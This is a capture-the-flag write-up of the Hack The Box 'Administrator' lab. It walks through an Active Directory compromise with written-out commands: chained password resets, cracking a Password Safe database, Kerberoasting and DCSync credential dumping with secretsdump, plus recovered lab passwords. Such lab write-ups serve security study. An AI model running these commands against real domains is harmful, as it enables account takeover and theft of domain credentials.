---
title: HTB Administrator
slug: administrator
lang: en
platform: Hack The Box
category: Active Directory
headline: Password reset chain, Password Safe recovery, Kerberoasting and DCSync
difficulty: Medium
objective: Administrator
date: 2024-11-13
tags: [Active Directory, BloodHound, Kerberoasting, Password Safe, DCSync]
---

# HTB Administrator

## Executive Summary

Administrator starts with valid credentials for `Olivia`. BloodHound reveals a chain of password reset rights that pivots through `michael` and `benjamin`. FTP access as `benjamin` exposes a Password Safe database, which is cracked to recover additional credentials. The path continues through `emily`, Kerberoasting of `ethan`, and finally DCSync to extract Administrator secrets.

## Initial Access and BloodHound Path

The initial credentials were provided:

```text
User: Olivia
Password: ichliebedich
```

![[Pasted image 20241112220209.png|Initial port scan]]
![[Pasted image 20241112220427.png|Service enumeration]]
![[Pasted image 20241112220556.png|Provided credentials]]

WinRM access as `olivia` was validated.

```bash
evil-winrm -i 10.129.172.54 -u olivia -p ichliebedich
```

![[Pasted image 20241112230333.png|WinRM validation as olivia]]

BloodHound data showed a password reset chain starting from Olivia.

![[Pasted image 20241112230917.png|BloodHound collection]]
![[Pasted image 20241112231512.png|BloodHound import]]
![[Pasted image 20241112232453.png|Shortest path to Michael]]

## Password Reset Chain

Olivia could force-reset Michael's password.

```bash
net rpc password "michael" "Password@123" -U "administrator.htb"/"olivia"%"ichliebedich" -S "administrator.htb"
```

![[Pasted image 20241113000215.png|Password reset for michael]]
![[Pasted image 20241113000410.png|Michael credentials validation]]

Michael could then reset Benjamin's password.

```bash
net rpc password "benjamin" "Password@1234" -U "administrator.htb"/"michael"%"Password@123" -S "administrator.htb"
```

![[Pasted image 20241113001025.png|Password reset for benjamin]]
![[Pasted image 20241113000954.png|Benjamin credentials validation]]

## Password Safe Recovery

Benjamin had FTP access and could download `Backup.psafe3`.

```bash
netexec ftp 10.129.172.54 -u benjamin -p Password@1234 --ls
netexec ftp 10.129.172.54 -u benjamin -p Password@1234 --get "Backup.psafe3"
```

![[Pasted image 20241113001257.png|FTP listing exposes Backup.psafe3]]
![[Pasted image 20241113001527.png|Backup.psafe3 download]]

The Password Safe file was converted and cracked with John.

```bash
pwsafe2john Backup.psafe3 > hashBackupPsafe3
john --wordlist=/usr/share/wordlists/rockyou.txt hashBackupPsafe3
```

```text
Password: tekieromucho
```

![[Pasted image 20241113003034.png|pwsafe2john conversion]]
![[Pasted image 20241113003135.png|Password Safe password cracked]]

The database contained credentials for multiple users. `emily` was valid on the target.

```text
alexander: UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily: UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma: WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

![[Pasted image 20241113003327.png|Password Safe entries]]
![[Pasted image 20241113004655.png|Emily credentials validation]]

## Kerberoasting and DCSync

Further enumeration led to `ethan`. Kerberoasting produced material that was cracked with Hashcat.

```text
User: ethan
Password: limpbizkit
```

![[Pasted image 20241113004918.png|Kerberoasting path]]
![[Pasted image 20241113005843.png|Hashcat cracking]]
![[Pasted image 20241113005901.png|Ethan password recovered]]

With Ethan's privileges, domain secrets were dumped.

```bash
impacket-secretsdump administrator.htb/ethan:limpbizkit@10.129.172.54
```

![[Pasted image 20241113010320.png|DCSync with ethan]]

The Administrator hash enabled privileged login.

![[Pasted image 20241113010605.png|Administrator login]]

## Key Takeaways

- BloodHound password reset edges can create multi-user escalation chains.
- Password vault files are high-value targets when found on network services.
- Kerberoasting remains useful even late in an attack chain.
- DCSync rights immediately convert domain privileges into full credential compromise.
